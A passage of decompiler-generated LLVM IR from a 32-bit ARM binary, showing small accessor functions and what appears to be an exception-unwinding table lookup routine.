  uselistorder i32* @ip, { 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 13, 14, 15, 16, 17, 18, 19, 41, 20, 21, 22, 23, 42, 0, 43, 44, 26, 27, 25, 45, 46, 47, 48, 49, 86, 87, 88, 89, 24, 50, 28, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 9, 51, 10, 52, 53, 5, 1, 6, 54, 55, 3, 56, 4, 7, 57, 8, 58, 77, 78, 11, 79, 80, 81, 82, 83, 84, 85, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 2, 29, 30, 12, 73, 74, 75, 76 }
  uselistorder i32 16777215, { 0, 7, 2, 6, 1, 8, 4, 11, 5, 9, 3, 10 }
  uselistorder i32 16777214, { 1, 0, 2, 5, 3, 4, 6 }
  uselistorder i32* @r2, { 89, 1, 10, 5, 90, 13, 11, 12, 8, 14, 15, 91, 92, 93, 124, 94, 40, 41, 42, 43, 45, 46, 2, 47, 48, 44, 16, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 49, 66, 125, 50, 126, 17, 178, 179, 180, 181, 182, 183, 108, 51, 127, 128, 129, 130, 131, 132, 133, 59, 109, 134, 52, 135, 53, 110, 111, 112, 113, 140, 141, 142, 143, 144, 136, 137, 138, 139, 145, 3, 146, 147, 148, 149, 150, 67, 68, 69, 151, 153, 152, 154, 155, 156, 157, 158, 159, 160, 114, 161, 162, 163, 164, 165, 166, 167, 168, 169, 33, 34, 35, 36, 37, 38, 39, 115, 18, 19, 20, 31, 32, 4, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 116, 117, 118, 119, 55, 56, 54, 57, 58, 60, 61, 62, 63, 64, 65, 6, 70, 71, 72, 73, 74, 75, 76, 0, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 7, 120, 121, 122, 123, 170, 171, 172, 173, 174, 175, 176, 177, 9 }
  uselistorder i32* @r1, { 72, 73, 74, 75, 76, 77, 78, 79, 80, 0, 81, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 4, 83, 84, 97, 41, 18, 85, 42, 50, 98, 90, 86, 43, 99, 100, 101, 102, 103, 87, 88, 89, 104, 44, 105, 7, 51, 106, 6, 107, 5, 108, 109, 110, 2, 111, 34, 35, 36, 37, 38, 39, 40, 19, 20, 21, 32, 33, 3, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 91, 92, 93, 96, 45, 46, 47, 48, 49, 94, 95, 1, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135 }
  uselistorder i32* @r3, { 5, 35, 36, 6, 14, 4, 15, 12, 37, 39, 16, 17, 40, 21, 22, 2, 23, 25, 11, 24, 18, 38, 118, 26, 30, 41, 42, 19, 43, 87, 88, 89, 90, 91, 92, 8, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 0, 110, 111, 112, 7, 113, 114, 115, 116, 117, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 27, 55, 56, 10, 57, 58, 59, 60, 61, 69, 70, 71, 72, 73, 62, 63, 64, 65, 67, 68, 66, 74, 75, 3, 76, 77, 78, 13, 79, 80, 81, 1, 82, 83, 9, 84, 20, 85, 28, 29, 31, 32, 33, 34, 86 }
  uselistorder label %.thread67, { 1, 0 }
  uselistorder label %.thread62, { 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %.thread61, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
  uselistorder label %dec_label_pc_18144, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %bb133, { 1, 0 }
  uselistorder label %dec_label_pc_180e0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18020, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %bb124, { 1, 0 }
  uselistorder label %bb122, { 3, 2, 1, 0 }
  uselistorder label %.thread59, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_17f54, { 1, 0 }
  uselistorder label %dec_label_pc_17f48, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17f00, { 2, 1, 3, 0 }
  uselistorder label %bb118, { 1, 0, 3, 2 }
  uselistorder label %bb116, { 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_17e50, { 1, 0 }
  uselistorder label %dec_label_pc_17e24, { 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_17e1c, { 1, 0, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_17e08, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %bb97, { 3, 2, 1, 0 }
  uselistorder label %.thread57, { 3, 1, 2, 0 }
  uselistorder label %bb92, { 0, 1, 3, 2 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
}

define i32 @function_181c8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_181c8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_181c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_181c8, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_181c8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_181c8, %bb
  %v0_181cc = load i32, i32* %r1.global-to-local, align 4
  %v2_181cc = icmp eq i32 %v0_181cc, 0
  br i1 %v2_181cc, label %dec_label_pc_181d4, label %dec_label_pc_18204

dec_label_pc_181d4:                               ; preds = %bb8
  %tmp = icmp ult i32 %arg3, 16
  br i1 %tmp, label %bb9, label %.thread2

bb9:                                              ; preds = %dec_label_pc_181d4
  %v6_181d8 = icmp eq i32 %arg4, 0
  br i1 %v6_181d8, label %dec_label_pc_181e8, label %bb10

.thread2:                                         ; preds = %dec_label_pc_181d4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18210

bb10:                                             ; preds = %bb9
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18210

dec_label_pc_181e8:                               ; preds = %bb9
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_181e8 = mul i32 %arg3, 4
  %v1_181ec = load i32, i32* %r0.global-to-local, align 4
  %v2_181ec = add i32 %v1_181ec, %v3_181e8
  %v1_181f0 = add i32 %v2_181ec, 4
  %v2_181f0 = inttoptr i32 %v1_181f0 to i32*
  %v3_181f0 = load i32, i32* %v2_181f0, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_181f0, i32* %arg5, align 4
  ret i32 0

dec_label_pc_18204:                               ; preds = %bb8
  %tmp13 = icmp ult i32 %v0_181cc, 5
  br i1 %tmp13, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_18204
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_18204, %bb11
  %v0_1820c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp13, i32 %v0_1820c)
  br label %dec_label_pc_18210

dec_label_pc_18210:                               ; preds = %bb10, %.thread2, %bb12
  store i32 2, i32* %r0.global-to-local, align 4
  ret i32 2

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_18210, { 2, 0, 1 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_18218(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_18218:
  %v2_18218 = icmp eq i32 %arg2, 0
  br i1 %v2_18218, label %dec_label_pc_18220, label %dec_label_pc_18250

dec_label_pc_18220:                               ; preds = %dec_label_pc_18218
  %tmp = icmp ult i32 %arg3, 16
  br i1 %tmp, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_18220
  %v6_18224 = icmp eq i32 %arg4, 0
  br i1 %v6_18224, label %dec_label_pc_18234, label %bb8

.thread2:                                         ; preds = %dec_label_pc_18220
  br label %dec_label_pc_1825c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_1825c

dec_label_pc_18234:                               ; preds = %bb
  %v3_18238 = mul i32 %arg3, 4
  %v2_1823c = load i32, i32* %arg5, align 4
  %v2_18240 = add i32 %v3_18238, %arg1
  %v2_18248 = add i32 %v2_18240, 4
  %v3_18248 = inttoptr i32 %v2_18248 to i32*
  store i32 %v2_1823c, i32* %v3_18248, align 4
  ret i32 0

dec_label_pc_18250:                               ; preds = %dec_label_pc_18218
  %tmp11 = icmp ult i32 %arg2, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_18250
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_18250, %bb9
  %v0_18258 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_18258)
  br label %dec_label_pc_1825c

dec_label_pc_1825c:                               ; preds = %bb8, %.thread2, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32* @lr, { 4, 5, 61, 62, 63, 64, 65, 6, 7, 8, 9, 10, 89, 11, 12, 13, 14, 15, 18, 19, 20, 90, 91, 92, 164, 165, 16, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 0, 3, 103, 104, 105, 106, 161, 162, 163, 107, 108, 109, 87, 88, 110, 111, 112, 113, 114, 115, 116, 117, 69, 70, 118, 119, 166, 167, 120, 121, 122, 123, 84, 124, 71, 17, 72, 73, 74, 75, 1, 79, 80, 81, 82, 83, 76, 77, 78, 24, 25, 26, 27, 28, 29, 30, 32, 31, 2, 33, 34, 35, 36, 21, 22, 23, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 125, 126, 127, 66, 67, 68, 85, 86, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 168 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_1825c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_18264(i32 %arg1) local_unnamed_addr {
dec_label_pc_18264:
  %v1_18264 = add i32 %arg1, 68
  %v2_18264 = inttoptr i32 %v1_18264 to i32*
  %v3_18264 = load i32, i32* %v2_18264, align 4
  ret i32 %v3_18264
}

define i32 @function_18270(i32 %arg1) local_unnamed_addr {
dec_label_pc_18270:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_18274 = add i32 %arg1, 8
  %v2_18274 = inttoptr i32 %v1_18274 to i32*
  %v3_18274 = load i32, i32* %v2_18274, align 4
  %v2_18278 = icmp eq i32 %v3_18274, 0
  br i1 %v2_18278, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_18270
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18270, %bb
  %v2_1828c = xor i1 %v2_18278, true
  call void @__pseudo_cond_branch(i1 %v2_1828c, i32 %v3_18274)
  %v1_18298 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18298

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 0, 1, 2, 18, 3, 4, 5, 6, 7, 12, 19, 20, 21, 22, 23, 24, 15, 25, 13, 14, 8, 9, 10, 11, 16, 17, 26, 27, 28, 29 }
  uselistorder i1 true, { 0, 5, 6, 1, 2, 13, 14, 9, 10, 11, 3, 4, 12, 15, 16, 17, 18, 7, 8, 23, 24, 31, 32, 27, 28, 29, 19, 20, 30, 33, 34, 35, 21, 22, 25, 26, 36, 37, 38, 39, 40, 41, 42, 43, 44, 48, 45, 46, 49, 47, 50, 51, 52, 53, 54, 55, 56, 155, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 120, 75, 76, 77, 78, 79, 127, 126, 80, 156, 157, 146, 158, 159, 83, 160, 84, 85, 137, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 81, 82, 171, 172, 173, 118, 121, 145, 144, 96, 97, 98, 174, 99, 100, 128, 129, 139, 130, 140, 124, 138, 175, 125, 143, 176, 86, 177, 87, 88, 89, 178, 147, 148, 90, 91, 179, 149, 150, 92, 93, 180, 151, 152, 94, 95, 123, 181, 182, 141, 183, 101, 131, 102, 103, 132, 133, 134, 122, 104, 105, 106, 107, 108, 184, 185, 186, 187, 135, 188, 189, 190, 191, 192, 193, 113, 114, 194, 115, 116, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 112, 211, 212, 213, 214, 215, 216, 111, 217, 119, 136, 142, 117, 218, 109, 110, 154, 219, 153 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1829c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1829c:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_182a4 = call i32 @function_19718()
  %v0_182b0 = call i32 @function_19718()
  %v3_182b4 = load i32, i32* @r4, align 4
  store i32 %v3_182b4, i32* %stack_var_-48, align 4
  %v6_182b4 = load i32, i32* @r5, align 4
  %v9_182b4 = load i32, i32* @r6, align 4
  %v12_182b4 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32* %r5.global-to-local, align 4
  %v4_182c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32 32) to i32*), align 4
  %v2_182c8 = icmp eq i32 %v4_182c4, 0
  store i32 %v0_182b0, i32* %r6.global-to-local, align 4
  %v1_182d4 = add i32 %arg2, -2
  store i32 %v1_182d4, i32* %r4.global-to-local, align 4
  br i1 %v2_182c8, label %dec_label_pc_1830c, label %dec_label_pc_182dc

dec_label_pc_182dc:                               ; preds = %dec_label_pc_1829c
  call void @__pseudo_branch(i32 %v4_182c4)
  %v2_182ec = icmp eq i32 %v1_182d4, 0
  br i1 %v2_182ec, label %.thread, label %dec_label_pc_1832cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_182dc
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_182f4 = load i32, i32* %r6.global-to-local, align 4
  %v3_182f4 = add i32 %v2_182f4, 16
  %v4_182f4 = inttoptr i32 %v3_182f4 to i32*
  store i32 0, i32* %v4_182f4, align 4
  br label %dec_label_pc_182fc

dec_label_pc_182fc:                               ; preds = %.thread, %.thread10, %dec_label_pc_184a4, %dec_label_pc_18490, %dec_label_pc_1846c, %dec_label_pc_18444, %dec_label_pc_18344
  %v0_182fc = load i32, i32* %r2.global-to-local, align 4
  %v2_18304 = load i32, i32* %stack_var_-48, align 4
  store i32 %v2_18304, i32* %r4.global-to-local, align 4
  store i32 %v6_182b4, i32* %r5.global-to-local, align 4
  store i32 %v9_182b4, i32* %r6.global-to-local, align 4
  store i32 %v12_182b4, i32* %r7.global-to-local, align 4
  ret i32 %v0_182fc

dec_label_pc_1830c:                               ; preds = %dec_label_pc_1829c
  store i32 12, i32* %r2.global-to-local, align 4
  %v4_18314 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32 12) to i32*), align 4
  %v4_18318 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32 24) to i32*), align 4
  store i32 %v4_18318, i32* %r2.global-to-local, align 4
  %v2_1831c = sub i32 %v4_18314, %v4_18318
  %v3_18320 = sdiv i32 %v2_1831c, 8
  store i32 %v3_18320, i32* %stack_var_-52, align 4
  br label %dec_label_pc_1832c

dec_label_pc_1832cthread-pre-split:               ; preds = %dec_label_pc_182dc
  %v3_1832c.pr = load i32, i32* %stack_var_-52, align 4
  br label %dec_label_pc_1832c

dec_label_pc_1832c:                               ; preds = %dec_label_pc_1832cthread-pre-split, %dec_label_pc_1830c
  %v0_18370.pre = phi i32 [ %v1_182d4, %dec_label_pc_1832cthread-pre-split ], [ %v4_18318, %dec_label_pc_1830c ]
  %v1_18334 = phi i32 [ %v3_1832c.pr, %dec_label_pc_1832cthread-pre-split ], [ %v3_18320, %dec_label_pc_1830c ]
  %v2_18330 = icmp eq i32 %v1_18334, 0
  br i1 %v2_18330, label %dec_label_pc_18344, label %dec_label_pc_18360.preheader

dec_label_pc_18360.preheader:                     ; preds = %dec_label_pc_1832c
  %v2_18334 = add i32 %v1_18334, -1
  %v1_18390 = add i32 %v0_18370.pre, 8
  br label %dec_label_pc_18360.outer

dec_label_pc_18344.loopexit:                      ; preds = %dec_label_pc_183bc
  br label %dec_label_pc_18344

dec_label_pc_18344:                               ; preds = %dec_label_pc_18344.loopexit, %dec_label_pc_1832c, %dec_label_pc_18488
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1834c = load i32, i32* %r6.global-to-local, align 4
  %v2_1834c = add i32 %v1_1834c, 16
  %v3_1834c = inttoptr i32 %v2_1834c to i32*
  store i32 0, i32* %v3_1834c, align 4
  br label %dec_label_pc_182fc

dec_label_pc_18354:                               ; preds = %dec_label_pc_183b0
  %v3_18354 = icmp ult i32 %storemerge40, %v0_183b4
  br i1 %v3_18354, label %dec_label_pc_1835c, label %dec_label_pc_183cc

dec_label_pc_1835c:                               ; preds = %dec_label_pc_18354
  %v1_1835c = add nsw i32 %v3_18368, 1
  br label %dec_label_pc_18360.outer

dec_label_pc_18360.outer:                         ; preds = %dec_label_pc_1835c, %dec_label_pc_18360.preheader
  %v1_183bc.ph = phi i32 [ %v1_1835c, %dec_label_pc_1835c ], [ 0, %dec_label_pc_18360.preheader ]
  %v0_18360.ph = phi i32 [ %v0_18360, %dec_label_pc_1835c ], [ %v2_18334, %dec_label_pc_18360.preheader ]
  br label %dec_label_pc_18360

dec_label_pc_18360:                               ; preds = %dec_label_pc_18360.outer, %dec_label_pc_183c4
  %v0_18360 = phi i32 [ %v1_183c4, %dec_label_pc_183c4 ], [ %v0_18360.ph, %dec_label_pc_18360.outer ]
  %v2_18360 = add i32 %v0_18360, %v1_183bc.ph
  %tmp = icmp slt i32 %v2_18360, 0
  %v4_18364 = zext i1 %tmp to i32
  %v5_18364 = add i32 %v4_18364, %v2_18360
  %v3_18368 = sdiv i32 %v5_18364, 2
  %v3_1836c = mul i32 %v3_18368, 8
  %v2_18370 = add i32 %v3_1836c, %v0_18370.pre
  %v3_18370 = inttoptr i32 %v2_18370 to i32*
  %v4_18370 = load i32, i32* %v3_18370, align 4
  %v1_18374 = and i32 %v4_18370, 1073741824
  %v2_18374 = icmp eq i32 %v1_18374, 0
  %v2_18378 = or i32 %v4_18370, -2147483648
  %tmp82 = bitcast i32 %v4_18370 to float
  %tmp83 = call float @fabsf(float %tmp82)
  %v2_1837c = bitcast float %tmp83 to i32
  %storemerge = select i1 %v2_18374, i32 %v2_1837c, i32 %v2_18378
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_18380 = icmp eq i32 %v2_18334, %v3_18368
  store i32 %v2_18370, i32* %r7.global-to-local, align 4
  br i1 %v9_18380, label %dec_label_pc_183b0, label %dec_label_pc_18390

dec_label_pc_18390:                               ; preds = %dec_label_pc_18360
  %v2_18394 = add i32 %v3_1836c, %v1_18390
  %v3_18394 = inttoptr i32 %v2_18394 to i32*
  %v4_18394 = load i32, i32* %v3_18394, align 4
  %v1_1839c = and i32 %v4_18394, 1073741824
  %v2_1839c = icmp eq i32 %v1_1839c, 0
  %v2_183a0 = or i32 %v4_18394, -2147483648
  %tmp84 = bitcast i32 %v4_18394 to float
  %tmp85 = call float @fabsf(float %tmp84)
  %v2_183a4 = bitcast float %tmp85 to i32
  %storemerge39 = select i1 %v2_1839c, i32 %v2_183a4, i32 %v2_183a0
  %v1_183a8 = add i32 %v2_18394, -1
  %v2_183ac = add i32 %storemerge39, %v1_183a8
  br label %dec_label_pc_183b0

dec_label_pc_183b0:                               ; preds = %dec_label_pc_18360, %dec_label_pc_18390
  %storemerge40 = phi i32 [ %v2_183ac, %dec_label_pc_18390 ], [ -1, %dec_label_pc_18360 ]
  %v2_183b0 = add i32 %storemerge, %v2_18370
  %v0_183b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_183b4 = icmp ult i32 %v0_183b4, %v2_183b0
  br i1 %v3_183b4, label %dec_label_pc_183bc, label %dec_label_pc_18354

dec_label_pc_183bc:                               ; preds = %dec_label_pc_183b0
  %v9_183bc = icmp eq i32 %v3_18368, %v1_183bc.ph
  br i1 %v9_183bc, label %dec_label_pc_18344.loopexit, label %dec_label_pc_183c4

dec_label_pc_183c4:                               ; preds = %dec_label_pc_183bc
  %v1_183c4 = add nsw i32 %v3_18368, -1
  br label %dec_label_pc_18360

dec_label_pc_183cc:                               ; preds = %dec_label_pc_18354
  %v2_183cc = load i32, i32* %v3_18370, align 4
  %v1_183d0 = and i32 %v2_183cc, 1073741824
  %v2_183d0 = icmp eq i32 %v1_183d0, 0
  %v2_183d4 = or i32 %v2_183cc, -2147483648
  %tmp86 = bitcast i32 %v2_183cc to float
  %tmp87 = call float @fabsf(float %tmp86)
  %v2_183d8 = bitcast float %tmp87 to i32
  %v0_183dc = select i1 %v2_183d0, i32 %v2_183d8, i32 %v2_183d4
  %v2_183dc = add i32 %v0_183dc, %v2_18370
  %v1_183e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_183e0 = add i32 %v1_183e0, 72
  %v3_183e0 = inttoptr i32 %v2_183e0 to i32*
  store i32 %v2_183dc, i32* %v3_183e0, align 4
  %v0_183e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_183e4 = add i32 %v0_183e4, 4
  %v2_183e4 = inttoptr i32 %v1_183e4 to i32*
  %v3_183e4 = load i32, i32* %v2_183e4, align 4
  %v7_183e8 = icmp eq i32 %v3_183e4, 1
  br i1 %v7_183e8, label %.thread10, label %dec_label_pc_183fc

.thread10:                                        ; preds = %dec_label_pc_183cc
  %v1_183e8 = add i32 %v3_183e4, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_183f4 = load i32, i32* %r6.global-to-local, align 4
  %v3_183f4 = add i32 %v2_183f4, 16
  %v4_183f4 = inttoptr i32 %v3_183f4 to i32*
  store i32 %v1_183e8, i32* %v4_183f4, align 4
  br label %dec_label_pc_182fc

dec_label_pc_183fc:                               ; preds = %dec_label_pc_183cc
  %v1_183fc = icmp slt i32 %v3_183e4, 0
  br i1 %v1_183fc, label %.thread38, label %dec_label_pc_18414

.thread38:                                        ; preds = %dec_label_pc_183fc
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_18408 = load i32, i32* %r6.global-to-local, align 4
  %v5_18408 = add i32 %v4_18408, 76
  %v6_18408 = inttoptr i32 %v5_18408 to i32*
  store i32 %v1_183e4, i32* %v6_18408, align 4
  %v3_1840c = load i32, i32* %r2.global-to-local, align 4
  %v4_1840c = load i32, i32* %r6.global-to-local, align 4
  %v5_1840c = add i32 %v4_1840c, 80
  %v6_1840c = inttoptr i32 %v5_1840c to i32*
  store i32 %v3_1840c, i32* %v6_1840c, align 4
  br label %dec_label_pc_18434

dec_label_pc_18414:                               ; preds = %dec_label_pc_183fc
  %v1_18414 = and i32 %v3_183e4, 1073741824
  %v2_18414 = icmp eq i32 %v1_18414, 0
  %v2_18418 = or i32 %v3_183e4, -2147483648
  %tmp88 = bitcast i32 %v3_183e4 to float
  %tmp89 = call float @fabsf(float %tmp88)
  %v2_1841c = bitcast float %tmp89 to i32
  %storemerge42 = select i1 %v2_18414, i32 %v2_1841c, i32 %v2_18418
  %v1_18420 = add i32 %storemerge42, 4
  %v2_18424 = add i32 %v1_18420, %v0_183e4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1842c = load i32, i32* %r6.global-to-local, align 4
  %v2_1842c = add i32 %v1_1842c, 76
  %v3_1842c = inttoptr i32 %v2_1842c to i32*
  store i32 %v2_18424, i32* %v3_1842c, align 4
  %v0_18430 = load i32, i32* %r2.global-to-local, align 4
  %v1_18430 = load i32, i32* %r6.global-to-local, align 4
  %v2_18430 = add i32 %v1_18430, 80
  %v3_18430 = inttoptr i32 %v2_18430 to i32*
  store i32 %v0_18430, i32* %v3_18430, align 4
  br label %dec_label_pc_18434

dec_label_pc_18434:                               ; preds = %.thread38, %dec_label_pc_18414
  %v0_18434 = load i32, i32* %r6.global-to-local, align 4
  %v1_18434 = add i32 %v0_18434, 76
  %v2_18434 = inttoptr i32 %v1_18434 to i32*
  %v3_18434 = load i32, i32* %v2_18434, align 4
  store i32 %v3_18434, i32* %r2.global-to-local, align 4
  %v1_18438 = inttoptr i32 %v3_18434 to i32*
  %v2_18438 = load i32, i32* %v1_18438, align 4
  %v1_1843c = icmp slt i32 %v2_18438, 0
  br i1 %v1_1843c, label %dec_label_pc_18460, label %dec_label_pc_18444

dec_label_pc_18444:                               ; preds = %dec_label_pc_18434
  %v1_18444 = and i32 %v2_18438, 1073741824
  %v2_18444 = icmp eq i32 %v1_18444, 0
  %v2_18448 = or i32 %v2_18438, -2147483648
  %tmp90 = bitcast i32 %v2_18438 to float
  %tmp91 = call float @fabsf(float %tmp90)
  %v2_1844c = bitcast float %tmp91 to i32
  %v0_18450 = select i1 %v2_18444, i32 %v2_1844c, i32 %v2_18448
  %v2_18450 = add i32 %v0_18450, %v3_18434
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_18458 = add i32 %v0_18434, 16
  %v3_18458 = inttoptr i32 %v2_18458 to i32*
  store i32 %v2_18450, i32* %v3_18458, align 4
  br label %dec_label_pc_182fc

dec_label_pc_18460:                               ; preds = %dec_label_pc_18434
  %v3_18460 = udiv i32 %v2_18438, 16777216
  %v1_18464 = urem i32 %v3_18460, 16
  %v2_18464 = icmp eq i32 %v1_18464, 0
  br i1 %v2_18464, label %dec_label_pc_1846c, label %dec_label_pc_18480

dec_label_pc_1846c:                               ; preds = %dec_label_pc_18460
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18474 = load i32, i32* %r5.global-to-local, align 4
  %v2_18474 = add i32 %v0_18474, -37952
  %v2_18478 = add i32 %v0_18434, 16
  %v3_18478 = inttoptr i32 %v2_18478 to i32*
  store i32 %v2_18474, i32* %v3_18478, align 4
  br label %dec_label_pc_182fc

dec_label_pc_18480:                               ; preds = %dec_label_pc_18460
  %v7_18480 = icmp eq i32 %v1_18464, 1
  br i1 %v7_18480, label %dec_label_pc_184a4, label %dec_label_pc_18488

dec_label_pc_18488:                               ; preds = %dec_label_pc_18480
  %v7_18488 = icmp eq i32 %v1_18464, 2
  br i1 %v7_18488, label %dec_label_pc_18490, label %dec_label_pc_18344

dec_label_pc_18490:                               ; preds = %dec_label_pc_18488
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18498 = load i32, i32* %r5.global-to-local, align 4
  %v2_18498 = add i32 %v0_18498, -37968
  %v2_1849c = add i32 %v0_18434, 16
  %v3_1849c = inttoptr i32 %v2_1849c to i32*
  store i32 %v2_18498, i32* %v3_1849c, align 4
  br label %dec_label_pc_182fc

dec_label_pc_184a4:                               ; preds = %dec_label_pc_18480
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_184ac = load i32, i32* %r5.global-to-local, align 4
  %v2_184ac = add i32 %v0_184ac, -37960
  %v2_184b0 = add i32 %v0_18434, 16
  %v3_184b0 = inttoptr i32 %v2_184b0 to i32*
  store i32 %v2_184ac, i32* %v3_184b0, align 4
  br label %dec_label_pc_182fc

; uselistorder directives
  uselistorder i32 %v1_18464, { 2, 1, 0 }
  uselistorder i32 %v0_18434, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_183e4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_183b4, { 1, 0 }
  uselistorder i32 %v3_1836c, { 1, 0 }
  uselistorder i32 %v3_18368, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_18360, { 1, 0 }
  uselistorder i32 %v0_18360, { 1, 0 }
  uselistorder i32 %v2_18334, { 1, 0 }
  uselistorder i32 %v0_18370.pre, { 1, 0 }
  uselistorder i32 %v3_18320, { 1, 0 }
  uselistorder i32 %v1_182d4, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
